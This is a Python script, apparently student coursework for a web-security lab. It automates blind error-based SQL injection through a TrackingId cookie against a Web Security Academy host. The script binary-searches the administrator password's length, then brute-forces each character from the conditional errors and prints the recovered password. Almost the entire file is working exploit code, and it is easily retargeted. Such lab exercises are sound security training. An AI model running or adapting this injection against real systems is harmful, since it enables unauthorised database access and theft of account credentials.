import requests
import string
import warnings

#Group 10 in SE6002 NTU
#Ai Zhengjie, Song Changlin, Tao Zifeng, Tian Yunxuan

warnings.filterwarnings("ignore", category=requests.packages.urllib3.exceptions.InsecureRequestWarning)
urlhhh="0a99005a031509ad80428a27006d0081"

def testlength(len):
    extid = "xyz'||(SELECT CASE WHEN LENGTH(password)>" + str(len) + " THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
    url = "https://"+urlhhh+".web-security-academy.net/product"
    params = {"productId": 13}
    headers = {
        "Host": urlhhh+".web-security-academy.net",
        "Cookie": "TrackingId=" + extid + "; session=",
    }
    with requests.get(url, headers=headers, params=params, verify=False) as response:
        print(f"Request: Status Code - {response.status_code}")
        print(response.status_code)
        rescode=response.status_code
    return rescode

def testchar(pos,chart):
    extid = "xyz'||(SELECT CASE WHEN SUBSTR(password,"+ str(pos) +",1)='"+ chart +"' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
    url = "https://"+urlhhh+".web-security-academy.net/product"
    params = {"productId": 13}
    headers = {
        "Host": urlhhh+".web-security-academy.net",
        "Cookie": "TrackingId=" + extid + "; session=",
    }
    with requests.get(url, headers=headers, params=params, verify=False) as response:
        print(f"Request: Status Code - {response.status_code}")
        print(response.status_code)
        rescode = response.status_code
    return rescode

#testcode=testlength(100)

def binsearch(i):
    bigj=i
    smallj=0
    while True:
        print(bigj)
        print(smallj)
        midj=(smallj+bigj)//2
        testcode = testlength(midj)
        if testcode == 200:
            bigj=midj
        if testcode == 500:
            smallj=midj
        print("--------------------")
        if abs(bigj - smallj) <= 1:
            return midj

def brupass(passnum):
    ii=1
    passwordfound=""
    while ii<=passnum:
        allchar = string.ascii_lowercase + string.digits
        for tt in allchar:
            rescode=testchar(ii, tt)
            print("Now is:", passwordfound)
            if rescode==500:
                passwordfound += tt
        ii=ii+1
    return passwordfound

def mainmethod():
    passn=binsearch(100)
    print("The password length is:", passn)
    finalpassword=brupass(passn)
    print("The password length is:", passn)
    print("The password is:", finalpassword)

mainmethod()




